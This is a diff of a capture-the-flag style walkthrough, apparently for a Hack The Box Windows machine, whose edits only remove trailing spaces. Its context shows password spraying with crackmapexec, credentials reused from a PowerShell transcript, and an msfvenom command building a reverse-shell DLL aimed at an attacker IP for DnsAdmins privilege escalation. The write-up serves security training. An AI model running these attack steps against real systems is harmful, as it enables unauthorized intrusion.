@@ -102,7 +102,7 @@ naoki
 ```
 {% endcode %}
 
-We have a password lf `Welcome123!` and a username list, so password spraying with `crackmapexec` is next.&#x20;
+We have a password lf `Welcome123!` and a username list, so password spraying with `crackmapexec` is next.
 
 ```bash
 $ crackmapexec smb 10.129.85.209 -u users -p 'Welcome123!'
@@ -156,7 +156,7 @@ Mode                LastWriteTime         Length Name
 d--h--        12/3/2019   6:45 AM                20191203
 ```
 
-Within this file, there is a PowerShell transcript, which contains credentials.&#x20;
+Within this file, there is a PowerShell transcript, which contains credentials.
 
 {% code overflow="wrap" %}
 ```
@@ -171,7 +171,7 @@ At line:1 char:1
 ```
 {% endcode %}
 
-With these credentials, we can login as `ryan`.&#x20;
+With these credentials, we can login as `ryan`.
 
 <figure><img src="../../../.gitbook/assets/image (3321).png" alt=""><figcaption></figcaption></figure>
 
@@ -225,7 +225,7 @@ We can use this guide to get a SYSTEM shell.
 
 {% embed url="https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/" %}
 
-First, let's create a reverse shell DLL file via `msfvenom`. Afterwards, we need to host it using `smbserver.py`.&#x20;
+First, let's create a reverse shell DLL file via `msfvenom`. Afterwards, we need to host it using `smbserver.py`.
 
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.13 LPORT=443 -f dll -o shell.dll
